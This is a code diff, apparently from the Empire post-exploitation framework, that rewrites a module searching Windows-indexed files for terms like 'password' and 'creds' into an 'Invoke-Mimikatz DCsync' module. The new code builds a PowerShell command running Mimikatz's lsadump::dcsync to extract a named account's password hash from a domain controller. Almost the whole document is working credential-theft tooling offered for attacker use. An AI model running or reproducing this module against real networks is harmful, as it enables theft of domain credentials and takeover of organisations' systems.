@@ -5,24 +5,29 @@ class Module:
     def __init__(self, mainMenu, params=[]):
 
         self.info = {
-            'Name': 'Get-IndexedItem ',
+            'Name': 'Invoke-Mimikatz DCsync',
 
-            'Author': ['@James O\'Neill'],
+            'Author': ['@gentilkiwi', '@JosephBialek'],
 
-            'Description': ('Gets files which have been indexed by Windows desktop search.'),
+            'Description': ("Runs PowerSploit's Invoke-Mimikatz function "
+                            "to extract a given account password through "
+                            "Mimikatz's lsadump::dcsync module. This doesn't "
+                            "need code execution on a given DC, but needs to be "
+                            "run from a user context with DA equivalent privileges."),
 
-            'Background' : False,
+            'Background' : True,
 
             'OutputExtension' : None,
             
-            'NeedsAdmin' : False,
+            'NeedsAdmin' : True,
 
             'OpsecSafe' : True,
 
             'MinPSVersion' : '2',
             
             'Comments': [
-                'https://gallery.technet.microsoft.com/scriptcenter/Get-IndexedItem-PowerShell-5bca2dae'
+                'http://blog.gentilkiwi.com',
+                'http://clymb3r.wordpress.com/'
             ]
         }
 
@@ -35,10 +40,15 @@ class Module:
                 'Required'      :   True,
                 'Value'         :   ''
             },
-            'Terms' : {
-                'Description'   :   'Terms to query the search indexer for.',
+            'user' : {
+                'Description'   :   'Username to extract the hash for (domain\username format).',
                 'Required'      :   True,
-                'Value'         :   'password,pass,sensitive,admin,login,secret,creds,credentials'
+                'Value'         :   ''
+            },
+            'domain' : {
+                'Description'   :   'Specified (fqdn) domain to pull for the primary domain/DC.',
+                'Required'      :   False,
+                'Value'         :   ''
             }
         }
 
@@ -56,7 +66,7 @@ class Module:
     def generate(self):
         
         # read in the common module source code
-        moduleSource = self.mainMenu.installPath + "/data/module_source/collection/Get-IndexedItem.ps1"
+        moduleSource = self.mainMenu.installPath + "/data/module_source/credentials/Invoke-Mimikatz.ps1"
 
         try:
             f = open(moduleSource, 'r')
@@ -69,19 +79,13 @@ class Module:
 
         script = moduleCode
 
-        script += "Get-IndexedItem "
+        script += "Invoke-Mimikatz -Command "
 
-        for option,values in self.options.iteritems():
-            if option.lower() != "agent":
-                if values['Value'] and values['Value'] != '':
-                    if values['Value'].lower() == "true":
-                        # if we're just adding a switch
-                        script += " -" + str(option)
-                    else:
-                        script += " -" + str(option) + " " + str(values['Value']) 
+        script += "'\"lsadump::dcsync /user:" + self.options['user']['Value']
 
-        # extract the fields we want
-        script += " | ?{!($_.ITEMURL -like '*AppData*')} | Select-Object ITEMURL, COMPUTERNAME, FILEOWNER, SIZE, DATECREATED, DATEACCESSED, DATEMODIFIED, AUTOSUMMARY"
-        script += " | fl | Out-String;"
-        
+        if self.options["domain"]['Value'] != "":
+            script += " /domain:" + self.options['domain']['Value']
+
+        script += "\"';"
+
         return script
